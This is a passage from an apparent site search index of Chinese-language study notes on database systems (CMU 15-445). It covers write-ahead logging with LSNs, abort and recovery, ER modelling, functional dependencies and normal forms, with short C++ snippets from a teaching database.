<p>\u8981\u5b9e\u73b0\u4e0a\u8ff0\u4e24\u4e2a\u505a\u6cd5\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u4e8e\u6240\u6709\u7684\u65e5\u5fd7\u5b58\u50a8\u4e00\u4e2aLSN\u7684\u5b57\u6bb5\uff0c\u8fd9\u4e2aLSN\u552f\u4e00\u6807\u8bb0\u4e00\u4e2a\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u987a\u5e8f\u589e\u957f\uff0c\u53ef\u4ee5\u8868\u793a\u65e5\u5fd7\u7684\u987a\u5e8f\u5173\u7cfb\uff0c\u540c\u65f6\u6211\u4eec\u8fd8\u4f1a\u5b58\u50a8\u6bcf\u4e2a\u4e8b\u52a1\u6700\u540e\u4e00\u4e2a\u64cd\u4f5c\u7684LSN\u503c\u3002</p> <pre><code>struct LogRec {\n    LogRec() = default;\n\n    LogRecType type_{LogRecType::kInvalid};\n    lsn_t lsn_{INVALID_LSN};\n    lsn_t prev_lsn_{INVALID_LSN};\n\n    [[maybe_unused]] KeyType old_key;\n    [[maybe_unused]] ValType old_value;\n    [[maybe_unused]] KeyType new_key;\n    [[maybe_unused]] ValType new_value;\n    txn_id_t txn_id;\n\n    /* used for testing only */\n    static std::unordered_map&lt;txn_id_t, lsn_t&gt; prev_lsn_map_;\n    static lsn_t next_lsn_;\n};\n</code></pre> <p>\u901a\u8fc7\u4e0a\u8ff0\u5b9e\u73b0\uff0c\u901a\u8fc7\u6bcf\u4e2a\u4e8b\u52a1\u7684\u6700\u540e\u4e00\u4e2aLSN\uff0c\u6211\u4eec\u53ef\u4ee5\u9006\u5e8f\u8ffd\u8e2a\u8fd9\u4e2a\u4e8b\u52a1\u6240\u6709\u7684\u65e5\u5fd7\u3002</p> <p>\u5e76\u4e14\u6211\u4eec\u8fd8\u5e94\u8be5\u5b58\u50a8FlushedLSN\uff0c\u8bb0\u5f55\u5237\u65b0\u5230\u78c1\u76d8\u7684\u6700\u540e\u4e00\u6761\u65e5\u5fd7\u8bb0\u5f55\u7684LSN</p> <p>\u540c\u65f6\u6211\u4eec\u8fd8\u5411\u6bcf\u4e2apage\u52a0\u4e0a\u4e00\u4e2a\u5b57\u6bb5\uff0c\u79f0\u4e3apageLSN\uff0c\u5b58\u50a8\u4e86\u4e0a\u6b21\u4fee\u6539\u9875\u9762\u7684\u64cd\u4f5c\u7684LSN\u3002\u4ee5\u4e0b\u4ee3\u7801\u6765\u81eaminisql\u7684page.h</p> <pre><code>  inline lsn_t GetLSN() { return *reinterpret_cast&lt;lsn_t *&gt;(GetData() + OFFSET_LSN); }\n\n  /** Sets the page LSN. */\n  inline void SetLSN(lsn_t lsn) { memcpy(GetData() + OFFSET_LSN, &amp;lsn, sizeof(lsn_t)); }\n</code></pre> <p>\u6b64\u65f6\u6211\u4eec\u7ef4\u62a4\u4e00\u4e2a\u4e0d\u7b49\u5f0f\uff0c\u6bcf\u5f53\u4e00\u4e2apage\u9700\u8981\u88ab\u5237\u5230\u78c1\u76d8\u91cc\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981check\u4e00\u4e0b\u8be5page\u7684LSN\u548cFlushedLSN\uff0c\u5982\u679c \\(pageLSN\\leq FlushedLSN\\) \u90a3\u4e48\u5c31\u53ef\u4ee5\u8fd9\u4e2apage\u5c31\u53ef\u4ee5\u88ab\u5237\u5165\u78c1\u76d8\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#_1","title":"\u4e8b\u52a1\u7ec8\u6b62","text":"<p>\u6709\u65f6\u5019\u7528\u6237\u4f1a\u4e3b\u52a8\u7ec8\u6b62\u4e8b\u52a1\uff0c\u6216\u8005\u662f\u7cfb\u7edf\u68c0\u6d4b\u5230\u6b7b\u9501\u7684\u65f6\u5019\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u6709\u4e86\u65b0\u7684\u65e5\u5fd7\u4e5f\u5373ABORT\u3002</p> <p>ABORT\u8868\u793a\u4e8b\u7269\u7ec8\u6b62\u6d41\u7a0b\u7684\u5f00\u59cb\uff0c\u5176\u540e\u9762\u4f1a\u5199\u5165\u4e00\u7cfb\u5217CLR\uff08compensation log record\uff09\u4e5f\u5373\u64a4\u9500\u524d\u9762\u64cd\u4f5c\u7684\u65e5\u5fd7\uff0c\u5176\u672c\u8eab\u4e0e\u524d\u9762\u7684UPDATE\u65e5\u5fd7\u57fa\u672c\u662f\u5bf9\u5e94\u7684\u3002\u8fd9\u91cc\u4e5f\u9700\u8981\u52a0\u4e0a\u65e5\u5fd7\u662f\u56e0\u4e3a\uff0c\u6211\u4eec\u65e0\u6cd5\u4fdd\u8bc1\u5728recovery\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u4e0d\u4f1a\u518d\u53d1\u751f\u5d29\u6e83\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/Concurrency%20and%20recovery/#log-recovery","title":"log recovery","text":"<p>\u901a\u8fc7\u4e0a\u8ff0\u7684\u7ed3\u6784\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u5efa\u51fa\u4e24\u4e2a\u8868\uff0c\u4e00\u4e2a\u8868\u5bf9\u5e94\u4e00\u4e2a\u4e8b\u52a1\uff0c\u4e00\u4e2a\u8868\u8868\u793a\u6240\u6709\u810f\u9875</p> <p>\u200b\u200b</p> <p>\u4e0b\u56fe\u4e2d\u7684recLSN\u662f\u7b2c\u4e00\u4e2a\u4f7fpage\u53d8\u810f\u7684LSN\u5e8f\u53f7</p> <p>\u200b\u200b</p> <p>\u901a\u8fc7\u4e0a\u8ff0\u7684\u8868\u6211\u4eec\u80fd\u5f88\u597d\u5730\u5b8c\u6210recovery\u5de5\u4f5c\u3002\u5f53\u6570\u636e\u5e93\u5d29\u6e83\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ea\u80fd\u4f7f\u7528\u5df2\u7ecf\u5b58\u5728\u4e8e\u78c1\u76d8\u91cc\u7684\u6570\u636e\u3002\u5728\u6062\u590d\u8fc7\u7a0b\u4e2d\u6211\u4eec\u505a\u4ee5\u4e0b\u5de5\u4f5c</p> <ol> <li>\u91cd\u5efa\u4e0a\u8ff0\u4e24\u5f20\u8868</li> <li>Redo \u91cd\u590d\u90a3\u4e9b\u672a\u5199\u5165\u7684\u78c1\u76d8\u7684\u4fee\u6539\u64cd\u4f5c\u4ee5\u786e\u4fdd\u6301\u4e45\u6027</li> <li>Undo \u64a4\u9500\u90a3\u4e9b\u5904\u4e8e\u4e2d\u95f4\u6001\u7684\u4e8b\u52a1\u4ee5\u786e\u4fdd\u539f\u5b50\u6027</li> </ol> <p>\u6211\u4eec\u5b9e\u9645\u4e0a\u9700\u8981\u628a\u8fd9\u4e24\u4e2a\u8868\u4e5f\u4f5c\u4e3a\u65e5\u5fd7\u7684\u4e00\u90e8\u5206\u5199\u5165\u78c1\u76d8</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/","title":"DB design","text":"<p>\u672c\u8282\u4e3b\u8981\u8ba8\u8bba\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2a\u5173\u7cfb\u578b\u6570\u636e\u5e93\u8868\uff0c\u6765\u6709\u6548\u5730\u8868\u793a\u73b0\u5b9e\u7684\u5bf9\u8c61</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#_1","title":"\u8868\u8bbe\u8ba1\u4e2d\u7684\u95ee\u9898","text":"<ul> <li>\u7a7a\u503c\u4e0d\u7b49\u4e8e\u7a7a\u503c</li> </ul> <p>superkey \u662f\u8d85\u952e \u662f\u6765\u786e\u5b9a\u552f\u4e00\u4e00\u4e2a\u5143\u7ec4\u7684\uff0c\u5176\u672c\u8eab\u53ef\u4ee5\u662f\u4e00\u4e2a\u96c6\u5408\uff0c\u6bd4\u5982\u6211\u4eec\u6709ID\u53ef\u4ee5\u786e\u5b9a\u4efb\u4f55\u4e00\u4e2a\u5143\u7ec4\uff0c\u90a3\u4e48ID\u548cname\u7684\u96c6\u5408\uff0cID\u548c\u6027\u522b\u7684\u96c6\u5408\uff0c\u90fd\u662f\u8d85\u952e</p> <p>candidate key  K \u662f\u6700\u5c0f\u7684\u8d85\u952e\uff0c\u5185\u90e8\u4e0d\u542b\u6709\u591a\u4f59\u5143\u7d20\uff0c\u4e5f\u5373\u4e0d\u662f\u96c6\u5408\uff0c\u4f46\u662f\u80fd\u591f\u552f\u4e00\u786e\u5b9a\u4e00\u4e2a\u5143\u7ec4</p> <p>foreign key \u662f\u6784\u5efa\u8868\u548c\u8868\u4e4b\u95f4\u5173\u7cfb\u7684\u5c5e\u6027</p> <p>primary key \u662f\u6211\u4eec\u5728\u8bbe\u8ba1\u6570\u636e\u5e93\u9009\u62e9\u7684\u5019\u9009\u952e\uff0cprimary key\u7684\u96c6\u5408\u662f\u8d85\u952e\uff1f</p> <p>null value</p> <ul> <li>todo</li> </ul> <p>null \u662f is null \u4e0d\u662f =null  null\u548c\u4efb\u610f\u6570\u636e\u505a\u8ba1\u7b97\u90fd\u662fnull</p> <p>null \u53c2\u4e0e\u6bd4\u8f83\u7684\u7ed3\u679c\u662f unknown\uff0c \u800cunknown\u6709\u81ea\u5df1\u7684\u4e00\u5957\u8fd0\u7b97\u89c4\u5219\uff0c\u89c1PPT</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#relational-algebra","title":"relational algebra","text":"<p>6\u4e2a\u57fa\u672c\u7684\u7b97\u5b50</p> <p>\u200b\u200b</p> <p>\u672c\u8d28\u4e0a\u8f93\u5165tables\uff0c\u8f93\u51fa\u65b0\u7684tables</p> <p>select operation</p> <p>\u200b\u200b</p> <p>\u8fd9\u5757\u8be6\u89c1sjl\u7684ppt\uff0crelational model</p> <p>project operation</p> <p>\u5220\u9664\u5236\u5b9a\u7684\u5c5e\u6027\u4e2d\uff0c\u91cd\u590d\u7684\u90e8\u5206</p> <p>union operation</p> <p>\u5728\u5c5e\u6027\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u628a\u4e24\u4e2atable\u5408\u5e76</p> <p>set difference operation</p> <p>\u5728\u5c5e\u6027\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u51cf\u53bb\u4e00\u4e2atable</p> <p>Cartesian product \u7b1b\u5361\u5c14\u79ef</p> <p>\u6bcf\u884c\u548c\u6bcf\u884c\u914d\u5bf9</p> <p>natural join</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#view","title":"view","text":"<ul> <li>view \u89c6\u56fe\u662f\u4ec5\u662f\u4e00\u4e2a\u67e5\u8be2</li> <li>material view \u662f\u628a\u6570\u636e\u62ce\u51fa\u6765\u91cd\u65b0\u505a\u4e00\u4e2a\u8868\uff0c\u7ef4\u62a4\u7684\u4ee3\u4ef7\u662f\u9700\u8981\u518d\u591a\u65b9\u8fdb\u884c\u7ef4\u62a4\u6570\u636e\u5b8c\u6574\u6027\uff0c\u9488\u5bf9\u90a3\u79cd\u591a\u7528\u67e5\u8be2\uff0c\u5c11\u505a\u5220\u6539\u7684table</li> </ul> <p>\u89c6\u56fe\u7684\u66f4\u65b0\uff0c\u89c6\u56fe\u7684\u884c\u4e3a\u8868\u73b0\u7684\u548c\u8868\u4e00\u6837\uff0c\u4f46\u662f\u5728\u66f4\u65b0\u8fc7\u7a0b\u4e2d\u5b58\u5728\u95ee\u9898\uff0c\u65f6\u523b\u610f\u8bc6\u5230view\u5e76\u975e\u4e00\u4e2a\u5b9e\u9645\u5b58\u5728\u7684\u8868\uff0c\u56e0\u6b64\u66f4\u65b0\u89c6\u56fe\u7684\u65f6\u5019\u8981\u5c0f\u5fc3</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#index","title":"index","text":"<p>\u5bf9\u4e8eindex\u6765\u8bf4\u6709\u4e00\u4e9btopics</p> <ul> <li>\u4e00\u7ef4\u548c\u591a\u7ef4\u7684\u7d22\u5f15</li> <li>\u5355\u70b9\u67e5\u8be2\u548c\u8303\u56f4\u67e5\u8be2</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#sql","title":"SQL \u91cc\u7684\u7f16\u7a0b\u8bed\u6cd5","text":"<p>\u53ef\u4ee5\u5199function\uff0c procedure</p> <p>if-else \u548c while repeat</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#_2","title":"\u5b8c\u6574\u6027\u7ea6\u675f","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#entity-relationship-models","title":"Entity-Relationship Models","text":"<p>tips\uff1a\u8fd9\u91cc\u9762\u7684\u90e8\u5206\u56fe\u6765\u81ea\u4e8eCS186\uff0c\u8003\u8bd5\u7684\u65f6\u5019ER\u56fe\u9700\u53c2\u7167ZJU\u7684PPT</p> <p>entity: \u63cf\u8ff0\u4e00\u4e2a\u73b0\u5b9e\u7684\u5bf9\u8c61\u7684\u4e00\u7cfb\u5217\u5c5e\u6027</p> <p>relationship: \u4e24\u4e2a\u6216\u591a\u4e2a\u5b9e\u4f53\u4e4b\u95f4\u7684\u8054\u7cfb\uff0c\u53ef\u4ee5\u662f\u4e00\u5bf9\u4e00\uff0c\u4e00\u5bf9\u591a\uff0c\u591a\u5bf9\u591a</p> <p>\u200b\u200b</p> <p>\u5728\u7ed8\u5236ER\u6a21\u578b\u56fe\u4e2d\u7684\u8fde\u7ebf\u5b58\u5728\u4e00\u4e9b\u89c4\u8303\uff1a</p> <ul> <li>\u5173\u7cfb\u548c\u5b9e\u4f53\u4e4b\u95f4\u7684\u8fde\u7ebf\u5982\u679c\u4e3a\u65e0\u7bad\u5934\u5b9e\u7ebf\uff0c\u90a3\u4e48\u8868\u793a\u591a\u5bf9\u591a\u7684\u5173\u7cfb\uff0c\u5982\u4e0a\u56fe\u4e2d\uff0cEmployee\u53ef\u4ee5\u5728\u591a\u4e2adepartment\u4e2d\u5de5\u4f5c\uff1bDepartment\u4e2d\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2aEmployee</li> <li>\u5982\u679c\u5b9e\u4f53\u5b58\u5728\u4e00\u4e2a\u6307\u5411\u5173\u7cfb\u7684\u6709\u7bad\u5934\u5b9e\u7ebf\uff0c\u90a3\u4e48\u5176\u8868\u793a\u4e00\u5bf9\u591a\u7684\u5173\u7cfb\uff0c\u4e5f\u5c31\u662fER\u56fe\u8868\u793a\u952e\u7ea6\u675f\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u5982\u4e0b\u56fe\u4e2d\uff0c\u8fd9\u4e2amanager\u7684\u5173\u7cfb\uff0c\u8868\u793a\uff0c\u4e00\u4e2aEmployee\u53ef\u80fd\u662f\u591a\u4e2aDepartments\u7684manager\uff0c\u4f46\u662f\u4e00\u4e2aDepartment\u4ec5\u6709\u6700\u591a\u4e00\u4e2amanager\uff0cPS\u8fd9\u91cc\u7684\u7bad\u5934\u65b9\u5411\u4e0e\u4e66\u91cc\u9762\u6b63\u597d\u76f8\u53cd\uff0c\u4e66\u91cc\u662f\u6307\u5411\u5b9e\u4f53</li> <li>ER\u56fe\u533a\u5206\u7ebf\u7684\u7c97\u7ec6\uff0c\u7c97\u7ebf\u8868\u793a\u81f3\u5c11\u4e00\u4e2a\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e2a\u5b9e\u4f53\u5728\u8fd9\u4e2a\u5173\u7cfb\u4e2d\u81f3\u5c11\u53c2\u52a0\u4e00\u4e2a\uff0c\u56fe\u5c31\u4e0d\u653e\u4e86\uff0c\u5982\u679c\u7ed9Employee\u548cworks_in \u7684\u7ebf\u52a0\u7c97\uff0c\u8868\u793aEmployee\u81f3\u5c11\u5728\u4e00\u4e2aDepartment\u5de5\u4f5c\u3002\u5982\u679c\u7ed9\u5e26\u7bad\u5934\u7684\u7ebf\u52a0\u7c97\uff0c\u5373\u8868\u793a\u6709\u4e14\u4ec5\u6709\u4e00\u4e2a\u7684\u610f\u601d</li> <li>\u5728ZJU\u7684course\u4e0a\uff0c\u5173\u7cfb\u548c\u5c5e\u6027\u7684\u8fde\u7ebf\u5f97\u662f\u865a\u7ebf</li> </ul> <p>\u200b\u200b</p> <p>weak entity</p> <p>\u5f31\u5b9e\u4f53\uff08weak entity\uff09\u662fER\u56fe\u7684\u4e00\u79cd\u7279\u6b8a\u7684\u5b9e\u4f53\uff0c\u5176\u901a\u8fc7\u53e6\u4e00\u4e2a\u5b9e\u4f53\u7684\u4e3b\u952e\u6765\u552f\u4e00\u6807\u8bc6\uff0c\u4e0e\u53e6\u4e00\u4e2aentity\u4e4b\u95f4\u6784\u6210\u4e00\u4e2arelation\uff0c\u5e76\u4e14\u5fc5\u987b\u552f\u4e00\u4e14\u5168\u4f53\u5730\u53c2\u4e0e\u5230\u8fd9\u4e2a\u5173\u7cfb\u4e2d\u6765\u3002\u5982\u4e0b\u56fe\uff0c\u6211\u4eec\u52a0\u7c97\u8fd9\u4e2a\u5f31\u5b9e\u4f53Dependents\u4e0e\u5176\u5bf9\u5e94\u7684entity\u4e4b\u95f4\u7684\u5173\u7cfbPolicy</p> <p>\u200b\u200b</p> <p>\u865a\u5b9e\u4f53\u4e2d\u5b58\u5728partial key\uff0c\u7528\u865a\u7ebf\u4e0b\u5212\u7ebf\u6807\u8bb0\uff0c\u865a\u5b9e\u4f53\u4f9d\u8d56\u76f8\u5173\u5b9e\u4f53\u7684\u4e3b\u952e\u548cpartial key\u552f\u4e00\u786e\u5b9a\uff0c\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\uff0c\u4e5f\u5c31\u662f\u9760Employee\u7684ssn\u548cpname</p> <p>\u590d\u6742\u7684\u5c5e\u6027</p> <p>\u5728ER\u56fe\u4e2d\u6211\u4eec\u53ef\u4ee5\u8868\u793a\u4e00\u4e9b\u590d\u6742\u7684\u4fe1\u606f\uff0c\u5305\u62ec\u590d\u5408\u5c5e\u6027\u548c\u591a\u503c\u5c5e\u6027\u7b49\uff0c\u5982\u4e0b\u56fe</p> <p></p> <p>\u6982\u5316\uff0c\u76f8\u4ea4\u6982\u5316\u548c\u4e0d\u76f8\u4ea4\u6982\u5316</p> <p>\u89d2\u8272</p> <p>\u5728ER\u56fe\u4e2d\uff0c\u6211\u4eec\u4f1a\u5728\u83f1\u5f62\u548c\u77e9\u5f62\u4e4b\u95f4\u7684\u8fde\u7ebf\u4e0a\u8fdb\u884c\u6807\u6ce8\u6765\u8868\u793a\u89d2\u8272</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u4e09\u5143\u7684\u8054\u7cfb\u96c6\u5408</p> <p>\u6211\u4eec\u53ea\u5141\u8bb8\u6700\u591a\u4e00\u4e2a\u7bad\u5934\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a\u4e00\u5bf9\u591a\u7684\u5173\u7cfb\uff0c\u8981\u4e48\u90fd\u662f\u591a\u5bf9\u591a\u7684\u5173\u7cfb</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#er","title":"\u5c06ER\u56fe\u8f6c\u4e3a\u5173\u7cfb\u6a21\u5f0f","text":"<p>\u5bf9\u4e8e\u5b9e\u4f53\u96c6\u5408\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u5fc5\u9700\u7684\u6570\u636e\u90fd\u653e\u5230\u4e00\u8d77</p> <p>\u5bf9\u4e8e\u8054\u7cfb\u4f53\uff0c\u6211\u4eec\u6839\u636e\u591a\u5bf9\u591a\uff0c\u4e00\u5bf9\u591a\u7b49\u65b9\u5f0f\u8fdb\u884c\u533a\u5206\uff0c\u5c06\u5bf9\u5e94\u5b9e\u4f53\u7684\u4e3b\u952e\u548c\u8054\u7cfb\u81ea\u8eab\u7684\u5c5e\u6027\u7ec4\u5408\u5230\u4e00\u8d77</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#optimization-database","title":"optimization database","text":"<p>\u5f53\u6211\u4eec\u5efa\u7acb\u597ddatabase\u7684\u65f6\u5019\uff0c\u9700\u8981\u4e00\u4e9b\u65b9\u6cd5\u53bb\u5206\u6790\uff0c\u6211\u4eec\u7684database\u662f\u5426\u5408\u7406\uff0c\u6700\u5173\u952e\u5728\u4e8e\u662f\u5426\u5b58\u50a8\u4e86\u5197\u4f59\u7684\u4fe1\u606f</p> <ul> <li>\u5b58\u50a8\u4fe1\u606f\u4e0d\u80fd\u6709\u4e0d\u5fc5\u8981\u7684\u5197\u4f59</li> <li>\u68c0\u7d22\u548c\u66f4\u65b0\u4fe1\u606f\u7684\u6548\u7387\u8981\u9ad8</li> </ul> <p>\u6570\u636e\u5e93\u7cfb\u7edf\u9700\u8981\u9075\u5faa\u4e00\u7cfb\u5217\u7684\u8303\u5f0f</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/DB%20design/#_3","title":"\u8303\u5f0f","text":"<p>First normal form</p> <p>\u5173\u7cfb\u6a21\u578b\u7684R\u7684\u6240\u6709\u5c5e\u6027\u90fd\u662f\u6ee1\u8db3\u539f\u5b50\u6027\u7684atomic\uff08\u5c5e\u6027\u4e0d\u80fd\u518d\u5411\u4e0b\u62c6\u5206\uff09</p> <p>\u4f46\u662f\u7b2c\u4e00\u8303\u5f0f\u5b58\u5728\u4e00\u4e9b\u95ee\u9898</p> <ul> <li>\u6570\u636e\u5197\u4f59</li> <li>\u66f4\u65b0\u6570\u636e\u590d\u6742\uff08\u5c5e\u6027\u88ab\u8fc7\u5206\u7ec6\u5206\u7684\u7ed3\u679c\uff09</li> <li>\u63d2\u5165\u5220\u9664\u6570\u636e\u5f02\u5e38</li> </ul> <p>functional dependency and normalization</p> <p>\u6211\u4eec\u505a\u5982\u4e0b\u5b9a\u4e49\uff0c\u5982\u679c\u5728\u5bf9\u4e8e\u4e00\u4e2a\u5173\u7cfb\u6a21\u5f0fR\u4e2d\u5c5e\u6027X\u76f8\u540c\u5219\u5c5e\u6027Y\u5fc5\u76f8\u540c\uff0c\u79f0X column determines Y column\uff0c\u8bb0\u4e3a</p> \\[ X\\to Y \\] <p>\u4ee5\u6b64\u6211\u4eec\u53ef\u4ee5\u8f83\u4e3a\u4e25\u683c\u5730\u8bc1\u660esuper key, primary key\u548ccandidate key\u7684\u6982\u5ff5</p> <p>\u6211\u4eec\u5b9a\u4e49\\(F\\)\u662f\u67d0\u4e2a\u5173\u7cfb\u4e2d\u7684functional dependencies\uff0c\u5219\\(F+\\)\u662f\u6307\u8be5\\(F\\)\u7684\u6269\u5c55\uff0c\u57fa\u4e8e\u539f\u59cb\u51fd\u6570\u4f9d\u8d56\u63a8\u5bfc\u51fa\u7684\u6240\u6709\u51fd\u6570\u4f9d\u8d56\u5173\u7cfb\u4ea7\u751f\u7684\u96c6\u5408\uff0c\u53ef\u4ee5\u901a\u8fc7\\(F\\)\u6269\u5c55\u51fa\u7684\u96c6\u5408\u4f8b\u5982</p> \\[ F = \\{ A\\rightarrow B,B\\rightarrow C\\} \\] <p>\u6211\u4eec\u53ef\u4ee5\u63a8\u51fa\\(A\\rightarrow C\\)\u5728\\(F+\\)\u4e2d</p> <p>\u5bf9\u4e8e\u51fd\u6570\u4f9d\u8d56\u6709\u4e00\u4e9b\u5b9a\u7406\uff0c\u89c1PPT*</p> <ul> <li>\u81ea\u53cd\u5f8b \u5927\u96c6\u5408\u5b9a\u4e49\u81ea\u8eab\u5b50\u96c6\u5408</li> <li>\u589e\u8865\u5f8b</li> <li>\u4f20\u9012\u5f8b a\u5230b\uff0cb\u5230c\u63a8\u51faa\u5230c</li> </ul> <p>\u57fa\u7840\u7684\u5c31\u4e0a\u9762\u4e09\u4e2a\uff0c\u4e0b\u9762\u8fd9\u4e09\u4e2a\u53ef\u4ee5\u4ece\u4e0a\u9762\u63a8\u51fa\uff1f</p> <ul> <li>\u5408\u5e76\u5f8b</li> <li>\u5206\u89e3\u5f8b</li> <li>\u4f2a\u4f20\u9012\u5f8b</li> </ul> <p>\u51fd\u6570\u4f9d\u8d56\u95ed\u5305\u8ba1\u7b97\u6cd5</p> <p>\u5bf9\u4e8e\u4eba\u7c7b\u6765\u8bf4\u753b\u56fe\u66f4\u52a0\u76f4\u89c2\uff0c\u4f46\u662f\u8003\u8bd5\u4e2d\u9700\u8981\u5e94\u7528\u4e0b\u56fe\u7a0b\u5e8f\u6765\u505a*</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u4e3a\u4ec0\u4e48\u8981\u8ba1\u7b97\u95ed\u5305</p> <ul> <li>\u6d4b\u8bd5\u5c5e\u6027\u662f\u5426\u4e3a\u4e3b\u952e</li> <li>\u6d4b\u8bd5\u51fd\u6570\u72ec\u7acb</li> </ul> <p>\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u8d85\u952e\u548c\u5019\u9009\u952e</p> <ul> <li>\u5bf9\u4e8e\u4e00\u4e2a\u5173\u7cfb\u6a21\u5f0fR\uff0c\u6211\u4eec\u627e\u5230\u4e00\u4e2aK\u4f7f\u5f97\\(K\\rightarrow R\\)\u6211\u4eec\u8ba4\u4e3aK\u662f\u8d85\u952e</li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u5173\u7cfb\u6a21\u5f0fR\uff0c\u6211\u4eec\u627e\u5230\u4e00\u4e2aK\u4f7f\u5f97\\(K\\rightarrow R\\)\u5e76\u4e14\u4e0d\u5b58\u5728\u4e00\u79cd\\(a\\subset K,a\\rightarrow R\\)\uff0c\u6211\u4eec\u8ba4\u4e3aK\u662f\u5019\u9009\u952e</li> </ul> <p>\u7279\u522b\u7684\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u5e73\u51e1\u7684\u7ed3\u8bba\uff1a\u5b50\u96c6\u4e00\u5b9a\u662f\u5bf9\u81ea\u5df1\u51fd\u6570\u4f9d\u8d56</p> <p>BCNF\u548c3NF\u90fd\u662f\u57fa\u4e8e\u51fd\u6570\u4f9d\u8d56</p> <p>\u6b63\u5219\u8986\u76d6 Canonical Cover</p> <p>\u6211\u4eec\u9700\u8981\u627e\u51fa\u548c\u539f\u51fd\u6570\u4f9d\u8d56\u7b49\u4ef7\u7684\u6700\u5c0f\u96c6\u5408\uff0c\u4f1a\u4f7f\u5f97\u6570\u636e\u5e93\u66f4\u65b0\u68c0\u67e5\u53d8\u5f97\u7b80\u5355</p> <ul> <li>\u6ca1\u6709\u5197\u4f59\u7684\u51fd\u6570\u4f9d\u8d56</li> <li>\u6bcf\u4e00\u4e2a\u5de6\u4fa7\u90fd\u662f\u552f\u4e00\u7684\uff1f* \u770bPPT\u4e0a\u4f8b\u5b50</li> <li> <p>\u5bf9\u4e8e\u65e0\u5173\u5c5e\u6027\u7684\u5148\u5b9a\u4e49\uff0c\u6211\u4eec\u5b58\u5728\\(a\\rightarrow b\\)</p> </li> <li> <p>\u82e5a\u4e2dA\u662f\u591a\u4f59\u7684\uff0c\u8ba1\u7b97\\((a-A)+\\)\u80fd\u5426\u4ecd\u7136\u63a8\u51fab\uff0c\u5982\u679c\u80fd\u5c31\u662f\u591a\u4f59\u7684</p> </li> <li>\u82e5b\u4e2d\u7684A\u662f\u591a\u4f59\u7684\uff0c\u8ba1\u7b97\uff1f\u770bPPT</li> </ul> <p>BCNF Decomposition</p> <p>\u53ef\u4ee5\u6d88\u9664\u57fa\u4e8e\u51fd\u6570\u4f9d\u8d56\u53ef\u4ee5\u53d1\u73b0\u7684\u5197\u4f59\uff0c\u5bf9\u4e8e\u8868\u8fdb\u884c\u5206\u89e3\uff0c\u53ef\u4ee5\u9632\u6b62\u66f4\u65b0\u56f0\u96be</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u6709\u51fd\u6570\u4f9d\u8d56\u96c6\u5408\\(F\\)\u7684\u5173\u7cfb\u6a21\u5f0f\\(R\\)\u7b26\u5408BCNF\u7684\u6761\u4ef6\u662f\uff0c\u5bf9\u4e8e\\(F+\\)\u4e2d\u6240\u6709\u5f62\u5982\\(a\\rightarrow b\\)\u7684\u51fd\u6570\u4f9d\u8d56\uff0c\u90fd\u81f3\u5c11\u6ee1\u8db3\u4ee5\u4e0b\u4e00\u9879</p> <ul> <li>\\(b\\subseteq a\\) \u4f8b\u5982 \\(ID,name \\rightarrow ID\\)</li> <li>a\u662fR\u7684\u4e00\u4e2asuper key\uff0c\u4e5f\u5373\\(a\\rightarrow R\\)\uff0c\u53ea\u8981\u9a8c\u8bc1a\u662f\u5426\u5b58\u5728\u4e00\u4e2a\u95ed\u5305\uff0c\u5305\u62ecR\u4e2d\u6240\u6709\u5143\u7d20</li> </ul> 